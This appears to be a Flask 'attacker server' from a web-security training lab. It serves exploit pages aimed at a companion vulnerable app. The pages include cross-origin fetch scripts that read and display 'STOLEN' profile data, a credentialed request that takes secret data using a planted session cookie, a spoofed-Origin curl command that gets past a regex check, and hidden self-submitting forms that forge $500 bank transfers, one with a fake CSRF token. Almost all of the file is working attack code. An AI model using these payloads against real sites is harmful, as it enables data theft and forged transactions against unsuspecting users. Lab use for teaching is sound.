"""
Attacker Server — Port 5001
Simulates a malicious website for CORS and CSRF exploits.
"""
import os
from flask import Flask, render_template, request

app = Flask(__name__)
VICTIM = os.environ.get("VICTIM_URL", "http://localhost:5000")

def _v():
    host = request.host
    if "app.github.dev" in host or "github.dev" in host:
        return f"https://{host.replace('-5001.', '-5000.')}"
    return VICTIM

@app.route("/")
def index(): return render_template("attacker_hub.html", victim=_v())

@app.route("/exploit/cors1")
def cors1():
    return f'''<html><body style="background:#1a0a0a;color:#e8d0d0;font-family:system-ui;padding:32px">
<h2 style="color:#ff4444">CORS Level 1 Exploit</h2><p>Fetching from {_v()}...</p>
<pre id="r" style="background:#2a1515;padding:16px;border-radius:8px;color:#88ff88"></pre>
<script>fetch('{_v()}/cors/api/public-profile').then(r=>r.json()).then(d=>document.getElementById('r').textContent='STOLEN: '+JSON.stringify(d,null,2)).catch(e=>document.getElementById('r').textContent='Error: '+e)</script></body></html>'''

@app.route("/exploit/cors2")
def cors2():
    return f'''<html><body style="background:#1a0a0a;color:#e8d0d0;font-family:system-ui;padding:32px">
<h2 style="color:#ff4444">CORS Level 2 — Regex Bypass</h2>
<p>This exploit needs your origin to end with "trusted-app.com".</p>
<p style="color:#dddd88">Use curl: <code style="background:#331818;padding:4px 8px;color:#ff8888">curl -H "Origin: https://evil-trusted-app.com" {_v()}/cors/api/trusted-profile</code></p>
</body></html>'''

@app.route("/exploit/cors3")
def cors3():
    return f'''<html><body style="background:#1a0a0a;color:#e8d0d0;font-family:system-ui;padding:32px">
<h2 style="color:#ff4444">CORS Level 3 — Credential Theft</h2>
<p>1. Go to <a href="{_v()}" style="color:#ff6666">{_v()}</a>, open console, run: <code style="background:#331818;padding:4px 8px;color:#ff8888">document.cookie="session_id=valid-session-token; path=/"</code></p>
<p>2. Then click: <button onclick="steal()" style="background:#ff4444;color:#fff;border:none;padding:8px 16px;border-radius:8px;cursor:pointer">Steal Credentials</button></p>
<pre id="r" style="background:#2a1515;padding:16px;border-radius:8px;color:#88ff88;margin-top:16px"></pre>
<script>function steal(){{fetch('{_v()}/cors/api/secret-profile',{{credentials:'include'}}).then(r=>r.json()).then(d=>document.getElementById('r').textContent='STOLEN: '+JSON.stringify(d,null,2)).catch(e=>document.getElementById('r').textContent='Error: '+e)}}</script></body></html>'''

@app.route("/exploit/csrf1")
def csrf1():
    return f'''<html><body style="background:#1a0a0a;color:#e8d0d0;font-family:system-ui;padding:32px">
<h2 style="color:#ff4444">CSRF Level 1 — Auto-Transfer</h2>
<p style="color:#aa6666">This page auto-submits a hidden form to transfer $500 to "attacker".</p>
<p style="color:#dddd88">In a real attack, the victim wouldn't see anything — the form submits instantly.</p>
<form id="csrf" action="{_v()}/csrf/bank" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="500">
</form>
<p style="margin-top:20px">Form will auto-submit in 2 seconds...</p>
<script>setTimeout(()=>document.getElementById('csrf').submit(), 2000)</script></body></html>'''

@app.route("/exploit/csrf2")
def csrf2():
    return f'''<html><body style="background:#1a0a0a;color:#e8d0d0;font-family:system-ui;padding:32px">
<h2 style="color:#ff4444">CSRF Level 2 — Token Bypass</h2>
<p style="color:#aa6666">The bank checks that a csrf_token field EXISTS but doesn't validate its value.</p>
<form id="csrf" action="{_v()}/csrf/bank2" method="POST">
  <input type="hidden" name="csrf_token" value="totally-fake-token">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="500">
</form>
<p style="margin-top:20px">Submitting with fake token in 2 seconds...</p>
<script>setTimeout(()=>document.getElementById('csrf').submit(), 2000)</script></body></html>'''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=True)
